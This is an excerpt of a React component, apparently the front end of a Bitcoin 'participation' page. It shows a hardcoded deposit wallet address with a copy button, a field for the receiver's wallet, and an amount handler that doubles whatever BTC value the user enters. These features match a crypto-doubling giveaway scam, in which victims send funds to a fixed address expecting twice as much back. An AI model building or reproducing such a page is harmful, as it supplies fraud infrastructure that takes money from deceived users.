...
export default function BTC() {
    ...
    const [approve, setApporve] = useState();


    function handleAmount(event) {
        setAmount(event.target.value * 2);
    }
                ...
                <div className="formGroup">
                    <div className="formInput formInputWithButton">
                        ...
                        <input className="input"
                            placeholder="receivers wallet address" type="text" /><button className=""> Confirm </button>
                    </div>
                    <div className="formInput formInputWithButton">
                        <p>Participation wallet</p>
                        <div className="input">
                            <div className="value">bc1qs7r5gnfpe5pcy5zt6afpe7mh6m4mwh774yzmh3</div>
                        </div><button className="">Copy address</button>
                    </div>
                    <div className="formInput formInputWithButton">
            ...
            <div className="calculator participateLeft">
                <div className="calculatorInput formContainer">
                    ...
                    <div className="block">
                        ...
                        <div><label className="input"><input value={amount} onChange={handleAmount} placeholder="Enter Amount" type="text" /><span className="currency">BTC</span></label>
                ...
                <div className="calculatorInput formContainer">
                    ...
                    <div className="block">
                        ...
                        <div><label className="input"><input placeholder="Waiting for input..." type="text" /><span
